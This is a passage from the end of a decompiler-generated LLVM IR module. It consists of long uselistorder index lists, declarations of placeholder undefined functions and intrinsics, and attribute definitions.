  uselistorder i32* @r0, { 13, 14, 15, 237, 238, 239, 16, 42, 79, 90, 240, 243, 244, 70, 17, 241, 242, 219, 46, 8, 245, 9, 18, 80, 0, 81, 10, 11, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 1, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 82, 41, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 19, 235, 20, 236, 21, 22, 23, 24, 161, 162, 272, 273, 275, 58, 59, 60, 61, 25, 193, 194, 2, 26, 27, 92, 93, 3, 28, 29, 276, 277, 4, 30, 31, 202, 203, 5, 32, 33, 67, 68, 274, 146, 91, 221, 34, 55, 56, 222, 6, 223, 224, 225, 213, 53, 214, 215, 216, 54, 217, 218, 35, 233, 226, 227, 228, 229, 230, 231, 232, 94, 95, 36, 204, 37, 205, 209, 38, 210, 189, 39, 190, 96, 40, 97, 211, 49, 212, 98, 43, 44, 163, 164, 165, 166, 99, 45, 100, 47, 48, 167, 168, 169, 170, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 64, 65, 131, 62, 63, 66, 132, 135, 136, 137, 138, 139, 140, 133, 134, 51, 141, 142, 143, 144, 145, 69, 147, 148, 52, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 180, 181, 182, 183, 184, 206, 207, 7, 185, 186, 187, 188, 191, 192, 195, 196, 197, 198, 199, 200, 201, 208, 220, 234, 57, 50 }
  uselistorder void (i32)* @__pseudo_branch, { 2, 69, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 18, 19, 20, 21, 22, 23, 14, 15, 16, 17, 24, 25, 26, 27, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 28, 29, 30, 74, 79, 80, 81, 82, 83, 84, 85, 75, 89, 90, 91, 92, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 40, 76, 77, 78, 86, 87, 88, 41, 42, 43, 0, 37, 38, 39, 44, 48, 49, 45, 46, 47, 1, 93, 31, 32, 33, 34, 35, 36, 60, 61 }
  uselistorder i32 0, { 412, 411, 475, 476, 1342, 416, 415, 477, 1343, 1344, 1345, 1346, 363, 362, 478, 1347, 1348, 201, 1349, 1351, 1352, 146, 147, 1353, 1354, 1350, 93, 94, 95, 96, 2, 1, 3, 0, 190, 189, 191, 192, 193, 1355, 413, 414, 140, 135, 1356, 1357, 195, 196, 194, 197, 1358, 1359, 1360, 1361, 200, 199, 198, 1362, 1363, 1364, 403, 402, 479, 417, 480, 418, 481, 419, 482, 483, 484, 148, 1365, 433, 432, 1366, 1367, 431, 430, 1368, 485, 428, 429, 426, 427, 425, 424, 1369, 423, 422, 421, 420, 372, 1370, 1386, 1371, 204, 1372, 1373, 1374, 1375, 1376, 1377, 206, 1379, 1380, 202, 203, 1381, 1382, 126, 149, 1383, 1384, 664, 97, 98, 404, 405, 205, 1378, 1385, 371, 1387, 486, 487, 1388, 435, 434, 207, 1389, 1390, 208, 1391, 1392, 1393, 109, 488, 489, 1394, 209, 1395, 150, 1396, 1397, 210, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 38, 127, 490, 1408, 211, 1409, 1410, 1411, 4, 1412, 1413, 5, 1414, 1415, 877, 878, 6, 141, 1416, 491, 1417, 791, 792, 793, 794, 795, 799, 796, 797, 798, 7, 373, 99, 800, 492, 801, 802, 803, 436, 437, 879, 880, 8, 493, 736, 494, 1418, 1419, 1420, 9, 10, 151, 152, 153, 1435, 1436, 11, 737, 154, 155, 1252, 1253, 1254, 1255, 212, 213, 1256, 746, 214, 128, 48, 1437, 100, 374, 1441, 1442, 49, 804, 110, 805, 806, 807, 375, 156, 1438, 1439, 1440, 376, 12, 1443, 1444, 1445, 1446, 1447, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1448, 1449, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 39, 1468, 1469, 1470, 1471, 1472, 40, 1473, 1474, 1475, 41, 1476, 1477, 1478, 42, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1503, 1504, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 43, 1522, 1523, 1524, 1525, 1526, 44, 1527, 1528, 1529, 1530, 1531, 45, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 215, 808, 665, 809, 810, 811, 812, 846, 495, 496, 847, 848, 157, 158, 159, 219, 813, 217, 814, 835, 828, 666, 829, 830, 831, 832, 50, 51, 113, 833, 834, 377, 836, 837, 667, 838, 216, 839, 52, 53, 112, 840, 841, 668, 842, 843, 54, 55, 111, 844, 218, 845, 160, 815, 669, 816, 817, 497, 818, 819, 670, 820, 821, 824, 822, 823, 378, 825, 56, 57, 115, 826, 671, 58, 59, 114, 827, 849, 672, 850, 851, 852, 853, 854, 855, 673, 856, 857, 858, 859, 739, 738, 381, 741, 742, 740, 379, 380, 743, 744, 498, 745, 747, 748, 674, 749, 750, 751, 675, 752, 753, 60, 61, 116, 754, 755, 756, 101, 102, 757, 758, 759, 220, 760, 761, 762, 763, 764, 499, 765, 766, 767, 768, 769, 770, 161, 773, 676, 774, 775, 62, 63, 118, 776, 777, 778, 677, 779, 780, 781, 782, 678, 783, 784, 64, 65, 117, 785, 786, 787, 788, 789, 221, 223, 771, 222, 772, 224, 790, 162, 860, 865, 866, 861, 862, 863, 868, 869, 870, 225, 871, 872, 873, 874, 875, 864, 867, 876, 163, 881, 882, 883, 500, 991, 501, 884, 1421, 1422, 1423, 226, 1424, 1317, 1316, 1260, 1233, 1099, 886, 885, 887, 992, 993, 994, 1547, 1548, 1549, 1550, 227, 1551, 1552, 1553, 1261, 1262, 400, 401, 502, 1558, 682, 1559, 503, 1560, 1561, 504, 1562, 1563, 680, 228, 383, 1564, 681, 1565, 505, 103, 1566, 1567, 506, 1582, 1583, 1586, 679, 382, 1587, 438, 165, 164, 1584, 1585, 1554, 1555, 683, 229, 364, 727, 13, 14, 1578, 1123, 891, 1577, 1200, 1318, 136, 231, 1319, 684, 230, 1320, 1321, 1568, 1569, 1570, 1571, 507, 1572, 166, 966, 967, 66, 67, 119, 1322, 1323, 108, 385, 1327, 1324, 1325, 685, 1326, 1328, 686, 1329, 1330, 1331, 1332, 68, 69, 120, 1333, 232, 1334, 1335, 1336, 1338, 1337, 384, 728, 730, 729, 233, 731, 732, 733, 508, 734, 167, 1556, 1557, 968, 969, 970, 971, 972, 973, 235, 168, 974, 975, 976, 137, 234, 977, 169, 510, 511, 1573, 509, 170, 171, 1268, 1269, 1270, 1271, 1272, 236, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 237, 1263, 512, 1264, 1265, 513, 1266, 1267, 172, 687, 238, 239, 1234, 514, 240, 1235, 1236, 1237, 1238, 1239, 173, 244, 243, 245, 241, 242, 247, 250, 249, 248, 246, 1280, 1281, 1305, 1306, 174, 1282, 1283, 254, 252, 253, 1284, 1285, 260, 259, 185, 251, 1286, 1287, 1288, 1289, 1290, 1291, 407, 406, 439, 515, 1292, 1293, 1294, 104, 1295, 256, 255, 257, 258, 184, 1296, 1297, 386, 1298, 1299, 144, 1300, 1301, 1302, 1303, 1304, 15, 16, 892, 893, 105, 17, 440, 516, 1223, 261, 1201, 1203, 1202, 1225, 1224, 1101, 1100, 895, 894, 896, 897, 898, 1227, 175, 1226, 1228, 1257, 1588, 1589, 121, 176, 995, 996, 997, 262, 888, 889, 263, 998, 1003, 1004, 1005, 1006, 264, 999, 265, 1000, 1001, 177, 1007, 978, 517, 1102, 1574, 1575, 1576, 899, 901, 900, 1008, 902, 1339, 903, 904, 905, 1579, 1580, 1581, 1002, 18, 1425, 1426, 1427, 142, 1428, 1429, 1430, 1431, 1432, 266, 1433, 688, 691, 689, 690, 1434, 692, 186, 267, 1009, 1010, 138, 396, 1011, 1012, 693, 19, 387, 268, 269, 270, 70, 271, 518, 906, 1013, 1014, 1015, 1242, 1241, 1243, 1244, 1245, 1246, 46, 272, 1247, 1248, 1249, 273, 129, 130, 473, 474, 890, 275, 274, 276, 1016, 277, 1017, 1018, 278, 1307, 1308, 519, 279, 1019, 280, 281, 1154, 282, 1124, 283, 284, 914, 907, 285, 908, 909, 910, 720, 721, 723, 708, 709, 698, 710, 722, 711, 699, 712, 700, 713, 701, 714, 702, 715, 716, 131, 71, 367, 368, 717, 703, 718, 704, 719, 724, 725, 520, 726, 911, 694, 912, 521, 913, 389, 388, 915, 916, 917, 918, 287, 286, 919, 920, 921, 705, 365, 922, 122, 123, 366, 923, 124, 125, 522, 925, 926, 695, 927, 928, 929, 930, 931, 523, 932, 933, 934, 397, 187, 697, 935, 936, 937, 938, 939, 940, 696, 941, 942, 524, 943, 525, 944, 947, 948, 949, 288, 945, 289, 946, 290, 924, 1125, 1126, 950, 291, 951, 952, 953, 954, 955, 956, 957, 370, 369, 958, 526, 959, 527, 960, 528, 961, 408, 964, 529, 965, 530, 962, 963, 531, 296, 295, 706, 178, 707, 294, 293, 292, 391, 398, 532, 979, 297, 298, 987, 980, 981, 982, 983, 984, 985, 986, 390, 988, 989, 72, 990, 299, 533, 139, 1020, 1021, 1022, 1023, 394, 1024, 1025, 1026, 393, 1027, 1028, 1029, 1030, 300, 1031, 1033, 1032, 179, 180, 301, 392, 303, 302, 1034, 304, 305, 106, 306, 1035, 309, 1036, 1037, 1038, 1039, 308, 307, 310, 1040, 1041, 73, 74, 181, 1042, 1043, 20, 21, 22, 23, 1044, 1045, 311, 442, 1046, 534, 1047, 535, 1048, 536, 1049, 537, 1050, 538, 1051, 539, 1052, 441, 1053, 315, 1055, 1056, 1057, 1058, 313, 312, 316, 1059, 1060, 75, 76, 1054, 314, 1062, 1061, 24, 25, 26, 27, 1063, 317, 1064, 1065, 444, 1066, 540, 1067, 541, 1068, 542, 1069, 543, 1070, 544, 1071, 545, 1072, 443, 1073, 546, 1074, 321, 1076, 1077, 1078, 1079, 319, 318, 322, 1080, 1081, 77, 78, 1075, 320, 1082, 79, 547, 1083, 1085, 1086, 1087, 1088, 548, 1089, 28, 29, 30, 31, 32, 1084, 323, 1090, 1091, 450, 1092, 449, 1093, 448, 1094, 447, 1095, 445, 1096, 446, 1097, 549, 1098, 327, 1104, 1105, 1106, 1107, 325, 324, 328, 1108, 1109, 80, 81, 1103, 326, 1110, 82, 550, 1111, 1113, 1114, 1115, 1116, 551, 1117, 33, 34, 35, 36, 37, 1112, 329, 1118, 1119, 452, 1120, 451, 1121, 552, 1122, 332, 1127, 1128, 1129, 1130, 331, 330, 333, 1131, 1132, 83, 84, 188, 143, 334, 107, 554, 1133, 1134, 1135, 1136, 1137, 335, 1138, 1139, 455, 1140, 1141, 1142, 1143, 339, 336, 337, 338, 1144, 1145, 1146, 1147, 555, 1148, 1149, 454, 1150, 553, 1151, 453, 1152, 556, 1153, 341, 1155, 1156, 1157, 1158, 340, 342, 1159, 1160, 85, 86, 132, 1161, 343, 1162, 1163, 458, 1164, 456, 1165, 457, 1166, 1169, 1170, 1171, 345, 346, 1172, 1173, 87, 1167, 1168, 344, 1175, 1174, 1176, 347, 1177, 1178, 461, 1179, 460, 1180, 459, 1181, 557, 1182, 1184, 1185, 1186, 349, 350, 351, 1188, 1189, 88, 1187, 1183, 348, 1191, 1192, 1190, 1193, 352, 1194, 1195, 464, 1196, 463, 1197, 462, 1198, 558, 1199, 356, 1205, 1206, 1207, 1208, 355, 354, 357, 1209, 1210, 89, 90, 1204, 353, 1211, 1212, 358, 1213, 1214, 467, 1215, 466, 1216, 465, 1217, 559, 1218, 561, 133, 91, 1219, 182, 468, 562, 563, 1220, 1221, 1222, 560, 565, 134, 92, 1229, 183, 469, 566, 1230, 1231, 1232, 564, 409, 1240, 1250, 359, 1251, 1258, 360, 1259, 1309, 145, 1310, 1311, 410, 567, 395, 1312, 1313, 47, 399, 1314, 1315, 568, 1340, 361, 1341, 1590, 470, 735, 471, 472, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 1591, 1592, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 1601, 1602, 1603, 1604, 1605 }
  uselistorder i32* @r4, { 87, 830, 831, 832, 833, 834, 852, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 10, 849, 850, 851, 853, 854, 855, 856, 857, 858, 859, 860, 94, 95, 96, 97, 140, 11, 141, 142, 143, 12, 144, 145, 146, 147, 148, 149, 150, 0, 13, 151, 152, 153, 154, 155, 156, 157, 158, 217, 218, 861, 88, 89, 90, 863, 864, 865, 5, 868, 57, 862, 747, 748, 98, 99, 100, 101, 102, 103, 104, 105, 106, 869, 870, 159, 160, 14, 4, 161, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 15, 162, 163, 164, 165, 166, 167, 168, 169, 188, 16, 189, 190, 170, 171, 173, 17, 174, 177, 18, 178, 179, 19, 180, 181, 20, 182, 183, 21, 184, 185, 22, 186, 54, 187, 172, 191, 23, 192, 193, 194, 195, 196, 197, 198, 175, 176, 91, 92, 93, 107, 108, 109, 110, 24, 111, 25, 26, 112, 113, 114, 115, 116, 117, 118, 123, 124, 27, 125, 126, 28, 127, 128, 29, 129, 130, 30, 131, 132, 31, 133, 134, 32, 135, 136, 119, 120, 121, 122, 137, 138, 139, 199, 200, 201, 33, 202, 203, 204, 34, 205, 206, 207, 208, 209, 210, 52, 211, 212, 213, 214, 215, 216, 219, 220, 221, 222, 352, 223, 866, 867, 812, 813, 814, 815, 816, 817, 711, 712, 353, 354, 887, 888, 889, 752, 753, 56, 892, 53, 893, 894, 895, 911, 913, 914, 915, 912, 896, 901, 909, 910, 890, 902, 903, 904, 905, 58, 59, 60, 818, 819, 6, 35, 820, 36, 821, 822, 823, 897, 898, 824, 79, 80, 81, 82, 83, 84, 891, 899, 900, 224, 225, 226, 227, 754, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 37, 772, 773, 774, 775, 755, 756, 757, 758, 759, 713, 714, 715, 716, 717, 718, 719, 720, 721, 38, 722, 723, 724, 725, 726, 727, 728, 729, 730, 776, 798, 799, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 55, 790, 791, 1, 792, 793, 794, 795, 796, 797, 231, 232, 233, 646, 647, 648, 649, 650, 653, 654, 655, 651, 652, 685, 686, 687, 688, 689, 690, 691, 499, 500, 501, 504, 505, 506, 502, 503, 234, 235, 236, 237, 238, 239, 240, 61, 241, 242, 692, 693, 694, 695, 696, 697, 698, 62, 355, 356, 357, 358, 359, 360, 361, 228, 229, 230, 362, 363, 364, 365, 9, 366, 367, 368, 369, 370, 371, 372, 243, 244, 245, 248, 249, 250, 246, 247, 251, 252, 253, 254, 255, 256, 906, 907, 908, 257, 258, 259, 373, 374, 375, 376, 377, 260, 261, 262, 589, 590, 548, 549, 263, 264, 265, 266, 267, 268, 269, 270, 74, 75, 76, 271, 272, 273, 274, 77, 65, 66, 63, 64, 67, 68, 69, 70, 71, 72, 73, 78, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 293, 294, 295, 296, 303, 304, 305, 306, 307, 7, 297, 298, 299, 300, 301, 302, 289, 290, 291, 292, 699, 700, 550, 551, 552, 553, 554, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 327, 328, 329, 330, 331, 332, 85, 321, 322, 323, 324, 325, 326, 333, 39, 40, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 378, 379, 8, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 41, 396, 42, 397, 43, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 44, 422, 45, 423, 46, 424, 47, 425, 426, 427, 428, 48, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 49, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 50, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 656, 657, 51, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 2, 678, 679, 680, 681, 682, 683, 684, 701, 702, 703, 3, 704, 705, 706, 707, 708, 709, 710, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 749, 750, 751, 800, 801, 804, 802, 803, 805, 806, 807, 808, 809, 810, 811, 825, 826, 827, 828, 86, 829 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
